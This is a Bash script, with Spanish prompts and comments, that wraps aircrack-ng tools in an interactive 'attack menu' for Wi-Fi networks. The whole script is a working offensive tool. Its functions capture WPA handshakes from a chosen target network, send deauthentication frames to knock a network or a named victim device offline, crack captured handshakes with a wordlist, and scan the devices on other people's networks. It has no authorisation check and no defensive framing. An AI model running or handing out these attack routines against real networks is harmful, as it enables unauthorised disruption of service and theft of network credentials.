#!/bin/bash

# Verificar si se ejecuta como root
if [ "$EUID" -ne 0 ]; then
  echo -e "\e[31m[!] Este script debe ejecutarse como root.\e[0m"
  exit 1
fi

# Colores
GREEN="\e[32m"
RED="\e[31m"
CYAN="\e[36m"
YELLOW="\e[33m"
RESET="\e[0m"

# Banner
clear
echo -e "${GREEN}"
echo " █████╗ ██╗██████╗  ██████╗██████╗ ███████╗ ██████╗██╗  ██╗"
echo "██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██║ ██╔╝"
echo "███████║██║██████╔╝██║     ██████╔╝█████╗  ██║     █████╔╝ "
echo "██╔══██║██║██╔═══╝ ██║     ██╔═══╝ ██╔══╝  ██║     ██╔═██╗ "
echo "██║  ██║██║██║     ╚██████╗██║     ███████╗╚██████╗██║  ██╗"
echo "╚═╝  ╚═╝╚═╝╚═╝      ╚═════╝╚═╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝"
echo -e "${RESET}"
sleep 1

# Funciones

scan_networks_basic() {
  echo -e "${CYAN}[*] Escaneando redes Wi-Fi (solo mostrar)...${RESET}"
  read -p ">> Interfaz en modo monitor (ej: wlan0mon): " iface
  airodump-ng "$iface"
}

scan_networks_select() {
  echo -e "${CYAN}[*] Escaneando redes...${RESET}"
  read -p ">> Interfaz en modo monitor (ej: wlan0mon): " iface
  airodump-ng "$iface" --write /tmp/scan_results --output-format csv

  echo -e "${CYAN}[*] Escaneo terminado. Selecciona una red...${RESET}"
  echo "Escribe el BSSID de la red a la que deseas acceder:"
  cat /tmp/scan_results-01.csv | grep -v "BSSID" | awk -F "," '{print $1 " - " $13}'  # Muestra BSSID y SSID
  read -p "BSSID de la red: " bssid
  read -p "Canal de la red: " channel

  # Ingresar a la red seleccionada con airodump-ng
  airodump-ng --bssid "$bssid" --channel "$channel" -w /tmp/connected_network "$iface"
}

capture_handshake() {
  echo -e "${CYAN}[*] Capturando handshake...${RESET}"
  read -p ">> Interfaz monitor: " iface
  read -p ">> Canal (CH): " channel
  read -p ">> BSSID objetivo: " bssid
  read -p ">> Archivo de salida: " output
  airodump-ng --bssid "$bssid" --channel "$channel" -w "$output" "$iface"
}

deauth_attack() {
  echo -e "${CYAN}[*] Ejecutando ataque de deautenticación...${RESET}"
  read -p ">> Interfaz monitor: " iface
  read -p ">> BSSID objetivo: " bssid
  read -p ">> Estación víctima (MAC del cliente, opcional): " station
  if [ -z "$station" ]; then
    aireplay-ng --deauth 10 -a "$bssid" "$iface"
  else
    aireplay-ng --deauth 10 -a "$bssid" -c "$station" "$iface"
  fi
}

crack_handshake() {
  echo -e "${CYAN}[*] Crackeando handshake...${RESET}"
  read -p ">> Archivo .cap: " cap
  read -p ">> Diccionario: " dict
  aircrack-ng "$cap" -w "$dict"
}

enable_monitor_mode() {
  echo -e "${CYAN}[*] Activando modo monitor...${RESET}"
  read -p ">> Interfaz Wi-Fi (ej: wlan0): " iface
  airmon-ng start "$iface"
}

disable_monitor_mode() {
  echo -e "${CYAN}[*] Desactivando modo monitor...${RESET}"
  read -p ">> Interfaz en modo monitor (ej: wlan0mon): " iface
  airmon-ng stop "$iface"
}

scan_connected_devices() {
  echo -e "${CYAN}[*] Escaneando dispositivos conectados a la red...${RESET}"
  read -p ">> Interfaz de red (ej: wlan0): " iface
  arp-scan --interface="$iface" --localnet
}

restart_network_manager() {
  echo -e "${CYAN}[*] Reiniciando NetworkManager...${RESET}"
  systemctl restart NetworkManager
  echo -e "${GREEN}[+] NetworkManager reiniciado.${RESET}"
}

# Función para escanear dispositivos conectados a otra red (usando airodump y arp-scan)
scan_connected_devices_other_network() {
  echo -e "${CYAN}[*] Escaneando dispositivos conectados a la red seleccionada...${RESET}"
  read -p ">> Interfaz de red (ej: wlan0): " iface
  read -p ">> Canal de la red objetivo (ej: 6): " channel
  read -p ">> BSSID de la red objetivo: " bssid

  # Cambiar al canal de la red objetivo
  iw dev "$iface" set type monitor
  iw dev "$iface" set channel "$channel"

  # Usar airodump para escanear la red objetivo y sus dispositivos
  airodump-ng --bssid "$bssid" --channel "$channel" -w /tmp/connected_network "$iface" &

  # Usar arp-scan para obtener los dispositivos conectados
  sleep 5  # Espera un momento para que airodump capture algo
  arp-scan --interface="$iface" --localnet
  killall airodump-ng  # Detener airodump después de obtener los resultados
}

# Menú principal
while true; do
  echo -e "\n${YELLOW}=== Menú de Ataques con Aircrack-ng ===${RESET}"
  echo "1. Escanear redes (solo mostrar)"
  echo "2. Escanear redes y seleccionar red"
  echo "3. Capturar handshake"
  echo "4. Ataque de deautenticación"
  echo "5. Crackear handshake con diccionario"
  echo "6. Activar modo monitor"
  echo "7. Desactivar modo monitor"
  echo "8. Ver dispositivos conectados en red"
  echo "9. Reiniciar NetworkManager"
  echo "10. Escanear dispositivos de otra red"
  echo "11. Salir"
  echo -n -e "${GREEN}\n>> Elige una opción: ${RESET}"
  read opt
  case $opt in
    1) scan_networks_basic ;;
    2) scan_networks_select ;;
    3) capture_handshake ;;
    4) deauth_attack ;;
    5) crack_handshake ;;
    6) enable_monitor_mode ;;
    7) disable_monitor_mode ;;
    8) scan_connected_devices ;;
    9) restart_network_manager ;;
    10) scan_connected_devices_other_network ;;
    11) echo -e "${RED}[*] Saliendo...${RESET}"; exit ;;
    *) echo -e "${RED}[!] Opción inválida${RESET}" ;;
  esac
done
